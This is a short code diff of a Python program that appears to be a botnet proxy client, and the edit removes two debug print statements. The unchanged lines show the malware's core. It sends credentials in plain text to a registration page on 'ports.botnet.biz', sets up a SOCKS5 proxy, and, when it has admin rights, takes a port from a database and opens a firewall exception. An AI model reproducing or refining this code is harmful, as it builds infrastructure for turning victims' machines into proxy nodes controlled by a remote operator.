@@ -21,7 +21,6 @@ def id_generator(size=9, chars=string.ascii_uppercase + string.digits):
 
 def registerCredentials(username, password):
         p = urllib.request.urlopen("http://ports.botnet.biz/registration.php?usr="+username+"&pwd="+password).read()
-        print(p)
 
 logging.basicConfig(level=logging.DEBUG)
 SOCKS_VERSION = 5
@@ -170,8 +169,6 @@ if is_admin():
 
         #get port from database
         port = int(getPort()[1])
-
-        print(port)
 
         #add firewall exception
         openFirewallPort()
